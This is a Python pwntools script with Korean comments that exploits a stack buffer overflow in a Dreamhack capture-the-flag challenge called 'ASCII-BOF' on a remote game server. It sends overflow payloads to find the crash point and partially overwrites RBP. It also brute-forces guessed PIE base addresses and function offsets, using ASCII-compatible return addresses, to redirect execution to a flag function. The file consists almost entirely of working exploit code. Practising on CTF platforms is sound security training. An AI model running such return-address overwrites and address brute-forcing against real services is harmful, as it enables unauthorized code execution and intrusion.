#!/usr/bin/env python3

"""
ASCII-BOF 서버 정보 수집 - PIE 베이스 탐지
"""

from pwn import *
import time

def probe_server_info():
    """서버 정보 프로빙"""
    print("[+] ASCII-BOF 서버 정보 수집")
    print("=" * 50)
    
    HOST = 'host8.dreamhack.games'
    PORT = 12458
    
    # 1. 기본 연결 테스트
    print("1. 기본 연결 및 응답 분석:")
    try:
        r = remote(HOST, PORT)
        welcome = r.recv(timeout=2)
        print(f"   Welcome 메시지: {welcome}")
        
        # 간단한 입력으로 응답 확인
        r.send(b"test\n")
        response = r.recv(timeout=2)
        print(f"   일반 응답: {response}")
        r.close()
    except Exception as e:
        print(f"   오류: {e}")
    
    # 2. 다양한 길이로 크래시 포인트 확인
    print("\n2. 크래시 포인트 분석:")
    for length in [16, 20, 24, 28, 30, 32, 36]:
        try:
            r = remote(HOST, PORT)
            r.recvline()  # Welcome
            
            payload = b"A" * length
            r.send(payload + b'\n')
            
            response = r.recvall(timeout=2)
            print(f"   길이 {length:2d}: {response}")
            r.close()
            
        except Exception as e:
            print(f"   길이 {length:2d}: 오류 - {e}")
    
    # 3. ASCII 바이트 테스트
    print("\n3. ASCII 바이트 범위 테스트:")
    test_chars = [
        0x20,  # 공백
        0x21,  # !
        0x30,  # 0
        0x39,  # 9
        0x41,  # A
        0x5A,  # Z
        0x61,  # a
        0x7E,  # ~
        0x7F,  # DEL (경계)
    ]
    
    for char in test_chars:
        try:
            r = remote(HOST, PORT)
            r.recvline()
            
            payload = b"A" * 24 + bytes([char])
            r.send(payload + b'\n')
            
            response = r.recvall(timeout=2)
            print(f"   0x{char:02x} ({chr(char) if 0x20 <= char <= 0x7E else '?'}): {response}")
            r.close()
            
        except Exception as e:
            print(f"   0x{char:02x}: 오류 - {e}")

def try_stack_leak():
    """스택 주소 유출 시도"""
    print("\n[+] 스택 주소 유출 시도")
    print("=" * 50)
    
    HOST = 'host8.dreamhack.games'
    PORT = 12458
    
    # RBP 부분만 덮어쓰기 (8바이트)
    for i in range(1, 9):
        try:
            r = remote(HOST, PORT)
            r.recvline()
            
            # 16바이트 버퍼 + i바이트 RBP 덮어쓰기
            payload = b"A" * 16 + b"B" * i
            r.send(payload + b'\n')
            
            response = r.recvall(timeout=2)
            print(f"   RBP {i}바이트 덮어쓰기: {response}")
            r.close()
            
        except Exception as e:
            print(f"   RBP {i}바이트: 오류 - {e}")

def test_return_variations():
    """다양한 반환 주소 시도"""
    print("\n[+] 반환 주소 변형 테스트")
    print("=" * 50)
    
    HOST = 'host8.dreamhack.games'
    PORT = 12458
    
    # 플래그 함수 오프셋은 0x1339로 확정
    # 다양한 PIE 베이스 계산
    flag_offset = 0x1339
    
    # 서버에서 흔히 사용되는 PIE 베이스들
    possible_bases = []
    
    # 0x55 시리즈 (일반적인 PIE)
    for i in range(0x4000, 0x8000, 0x1000):
        base = 0x555555550000 + i
        possible_bases.append(base)
    
    # 0x56 시리즈
    for i in range(0x0000, 0x4000, 0x1000):
        base = 0x564000000000 + i
        possible_bases.append(base)
    
    print(f"테스트할 베이스 개수: {len(possible_bases)}")
    
    for i, base in enumerate(possible_bases[:10]):  # 처음 10개만
        flag_addr = base + flag_offset
        addr_bytes = p64(flag_addr)[:6]
        
        # ASCII 호환성 체크
        if not all(0x20 < b < 0x7f for b in addr_bytes):
            continue
        
        print(f"\n{i+1:2d}. PIE 베이스: 0x{base:x}")
        print(f"    플래그 주소: 0x{flag_addr:x}")
        print(f"    바이트: {addr_bytes.hex()} ({addr_bytes})")
        
        payload = b"A" * 16 + b"B" * 8 + addr_bytes
        
        try:
            r = remote(HOST, PORT)
            r.recvline()
            r.send(payload + b'\n')
            
            response = r.recvall(timeout=2)
            print(f"    응답: {response}")
            
            if b'DH{' in response:
                print(f"🎉 성공! 올바른 PIE 베이스: 0x{base:x}")
                flag_match = re.search(rb'DH\{[^}]+\}', response)
                if flag_match:
                    flag = flag_match.group(0).decode()
                    print(f"🏆 플래그: {flag}")
                    return flag
            
            r.close()
            time.sleep(0.1)  # 서버 부하 방지
            
        except Exception as e:
            print(f"    오류: {e}")
    
    return None

def test_function_offsets():
    """다른 함수 오프셋들도 시도"""
    print("\n[+] 다른 함수 오프셋 테스트")
    print("=" * 50)
    
    HOST = 'host8.dreamhack.games'
    PORT = 12458
    
    # 분석에서 발견한 주요 오프셋들
    offsets = [
        0x1339,  # flag 함수 (기본)
        0x1229,  # main 함수
        0x1297,  # vuln 함수
        0x1000,  # 시작 부근
        0x1100,
        0x1200,
        0x1300,
        0x1400,
    ]
    
    pie_base = 0x555555554000  # 기본 베이스
    
    for offset in offsets:
        addr = pie_base + offset
        addr_bytes = p64(addr)[:6]
        
        # ASCII 호환성 체크
        if not all(0x20 < b < 0x7f for b in addr_bytes):
            print(f"오프셋 0x{offset:x}: ASCII 비호환")
            continue
        
        print(f"\n오프셋 0x{offset:x} 테스트:")
        print(f"  주소: 0x{addr:x}")
        print(f"  바이트: {addr_bytes.hex()}")
        
        payload = b"A" * 16 + b"B" * 8 + addr_bytes
        
        try:
            r = remote(HOST, PORT)
            r.recvline()
            r.send(payload + b'\n')
            
            response = r.recvall(timeout=2)
            print(f"  응답: {response}")
            
            if b'DH{' in response:
                print(f"🎉 성공! 오프셋: 0x{offset:x}")
                flag_match = re.search(rb'DH\{[^}]+\}', response)
                if flag_match:
                    return flag_match.group(0).decode()
            
            r.close()
            
        except Exception as e:
            print(f"  오류: {e}")
    
    return None

if __name__ == "__main__":
    import re
    
    print("🔍 ASCII-BOF 서버 상세 분석")
    print("=" * 60)
    
    # 1. 기본 정보 수집
    probe_server_info()
    
    # 2. 스택 정보 확인
    try_stack_leak()
    
    # 3. 다양한 PIE 베이스 시도
    flag = test_return_variations()
    
    if not flag:
        # 4. 다른 함수 오프셋 시도
        flag = test_function_offsets()
    
    if flag:
        print(f"\n🎉🎉🎉 최종 성공!")
        print(f"🏆 ASCII-BOF 플래그: {flag}")
    else:
        print("\n🤔 추가 분석이 필요합니다.")
        print("힌트: PIE 베이스나 함수 오프셋이 예상과 다를 수 있습니다.")
